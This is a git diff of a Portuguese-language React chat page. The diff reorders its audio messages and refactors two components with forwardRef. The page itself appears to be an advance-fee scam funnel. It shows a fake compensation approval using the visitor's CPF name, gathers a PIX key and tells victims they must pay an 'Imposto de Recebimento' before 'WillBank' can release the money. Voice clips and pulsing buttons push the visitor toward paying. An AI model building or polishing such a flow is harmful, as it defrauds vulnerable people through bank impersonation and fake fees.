@@ -1,4 +1,4 @@
-import { useEffect, useState, useRef } from "react";
+import { useEffect, useState, useRef, forwardRef } from "react";
 import { useNavigate, useLocation } from "react-router-dom";
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
@@ -281,10 +281,10 @@ const Chat = () => {
     await addBotMessage(<ApprovalAnimation value={valorBeneficio} name={cpfData?.nome || ""} />, false);
     await delay(3500);
 
-    // Audio 1 - Approval
-    await addAudioMessage("/audio/audio-1.mp3");
+    // Audio 3 - Validação (primeiro áudio após aprovação da identidade)
+    await addAudioMessage("/audio/audio-3.mp3");
     await delay(1000);
-    setWaitingForAudio("/audio/audio-1.mp3");
+    setWaitingForAudio("/audio/audio-3.mp3");
     setStep("audio-1-approval");
   };
   const handleAprovarIndenizacao = async () => {
@@ -369,7 +369,7 @@ const Chat = () => {
       </span>, true, 35);
     await delay(2000);
 
-    // Audio 2 - Comprovante
+    // Audio 2 - Comprovante (segundo áudio após confirmar PIX)
     await addAudioMessage("/audio/audio-2.mp3");
     await delay(1000);
     await addBotMessage(<span>Clique no botão abaixo para <strong>confirmar seu processo indenizatório</strong> e gerar seu comprovante de recebimento.</span>, true, 70);
@@ -503,11 +503,11 @@ const Chat = () => {
       </div>, true, 80);
     await delay(1500);
 
-    // Audio 3 - Taxas
-    await addAudioMessage("/audio/audio-3.mp3");
+    // Audio 1 - Taxas (terceiro e último áudio)
+    await addAudioMessage("/audio/audio-1.mp3");
     await delay(1500);
     await addBotMessage(<span>Somente após você finalizar o pagamento do Imposto de Recebimento a WillBank terá a autorização de realizar transferências de valor alto diante o monitoramento fiscal.</span>, true, 120);
-    setWaitingForAudio("/audio/audio-3.mp3");
+    setWaitingForAudio("/audio/audio-1.mp3");
     setStep("final");
   };
   const handleFinalPayment = () => {
@@ -625,11 +625,11 @@ const Chat = () => {
                   {option.text}
                 </Button>)}
 
-              {step === "audio-1-approval" && (waitingForAudio === null || audioListened.has("/audio/audio-1.mp3")) && <Button onClick={handleAprovarIndenizacao} className="bg-gradient-to-r from-green-500 to-emerald-500 hover:from-green-600 hover:to-emerald-600 text-white rounded-full font-bold shadow-lg px-8">
+              {step === "audio-1-approval" && (waitingForAudio === null || audioListened.has("/audio/audio-3.mp3")) && <Button onClick={handleAprovarIndenizacao} className="bg-gradient-to-r from-green-500 to-emerald-500 hover:from-green-600 hover:to-emerald-600 text-white rounded-full font-bold shadow-lg px-8">
                   ✓ SIM, APROVAR INDENIZAÇÃO
                 </Button>}
 
-              {step === "audio-1-approval" && waitingForAudio === "/audio/audio-1.mp3" && !audioListened.has("/audio/audio-1.mp3") && <p className="text-slate-400 text-sm animate-pulse">🎧 Ouça o áudio acima para continuar...</p>}
+              {step === "audio-1-approval" && waitingForAudio === "/audio/audio-3.mp3" && !audioListened.has("/audio/audio-3.mp3") && <p className="text-slate-400 text-sm animate-pulse">🎧 Ouça o áudio acima para continuar...</p>}
 
               {step === "pix-type-selection" && <div className="flex flex-col gap-2 w-full max-w-xs">
                   <Button onClick={handlePixTypeTelefone} variant="outline" className="bg-slate-700 hover:bg-slate-600 text-white border-slate-600 rounded-full font-bold shadow-lg px-8">
@@ -668,11 +668,11 @@ const Chat = () => {
                   ❓ PORQUE TENHO QUE PAGAR ESSE IMPOSTO?
                 </Button>}
 
-              {step === "final" && (waitingForAudio === null || audioListened.has("/audio/audio-3.mp3")) && <Button onClick={handleFinalPayment} className="bg-gradient-to-r from-green-500 to-emerald-500 hover:from-green-600 hover:to-emerald-600 text-white rounded-full font-bold shadow-lg px-6 animate-pulse">
+              {step === "final" && (waitingForAudio === null || audioListened.has("/audio/audio-1.mp3")) && <Button onClick={handleFinalPayment} className="bg-gradient-to-r from-green-500 to-emerald-500 hover:from-green-600 hover:to-emerald-600 text-white rounded-full font-bold shadow-lg px-6 animate-pulse">
                   💰 Concluir pagamento e receber minha indenização
                 </Button>}
 
-              {step === "final" && waitingForAudio === "/audio/audio-3.mp3" && !audioListened.has("/audio/audio-3.mp3") && <p className="text-slate-400 text-sm animate-pulse">🎧 Ouça o áudio acima para continuar...</p>}
+              {step === "final" && waitingForAudio === "/audio/audio-1.mp3" && !audioListened.has("/audio/audio-1.mp3") && <p className="text-slate-400 text-sm animate-pulse">🎧 Ouça o áudio acima para continuar...</p>}
             </div>}
 
           <div ref={messagesEndRef} />
@@ -731,17 +731,13 @@ const DataRow = ({
       <span className={`text-sm font-bold text-right ${highlight ? 'text-green-600 text-base' : 'text-foreground'}`}>{value}</span>
     </div>;
 };
-const AudioPlayerComponent = ({
-  audioSrc,
-  isPlaying,
-  onPlay,
-  listened
-}: {
+const AudioPlayerComponent = forwardRef<HTMLDivElement, {
   audioSrc: string;
   isPlaying: boolean;
   onPlay: () => void;
   listened?: boolean;
-}) => <div className="flex items-center gap-3 w-48">
+}>(({ audioSrc, isPlaying, onPlay, listened }, ref) => (
+  <div ref={ref} className="flex items-center gap-3 w-48">
     <button onClick={onPlay} className="w-10 h-10 bg-gradient-to-br from-primary to-amber-400 rounded-full flex items-center justify-center shadow-md hover:scale-105 transition-transform shrink-0 relative">
       {isPlaying ? <Pause className="w-5 h-5 text-primary-foreground" fill="currentColor" /> : <Play className="w-5 h-5 text-primary-foreground ml-0.5" fill="currentColor" />}
       {listened && <span className="absolute -top-1 -right-1 w-4 h-4 bg-green-500 rounded-full flex items-center justify-center border-2 border-slate-700">
@@ -759,7 +755,9 @@ const AudioPlayerComponent = ({
           <Check className="w-3 h-3" /> Ouvido
         </span>}
     </div>
-  </div>;
+  </div>
+));
+AudioPlayerComponent.displayName = "AudioPlayerComponent";
 
 // Approval Animation Component - Like the reference image
 const ApprovalAnimation = ({
@@ -828,11 +826,12 @@ const ApprovalAnimation = ({
       </div>
     </div>;
 };
-const AnimatedCheckDot = ({
-  completed
-}: {
-  completed: boolean;
-}) => <div className={`w-8 h-8 rounded-full flex items-center justify-center transition-all duration-500 ${completed ? 'bg-gradient-to-br from-primary to-amber-400 scale-100' : 'bg-muted scale-75'}`}>
-    {completed && <Check className="w-4 h-4 text-primary-foreground animate-scale-in" />}
-  </div>;
+const AnimatedCheckDot = forwardRef<HTMLDivElement, { completed: boolean }>(
+  ({ completed }, ref) => (
+    <div ref={ref} className={`w-8 h-8 rounded-full flex items-center justify-center transition-all duration-500 ${completed ? 'bg-gradient-to-br from-primary to-amber-400 scale-100' : 'bg-muted scale-75'}`}>
+      {completed && <Check className="w-4 h-4 text-primary-foreground animate-scale-in" />}
+    </div>
+  )
+);
+AnimatedCheckDot.displayName = "AnimatedCheckDot";
 export default Chat;
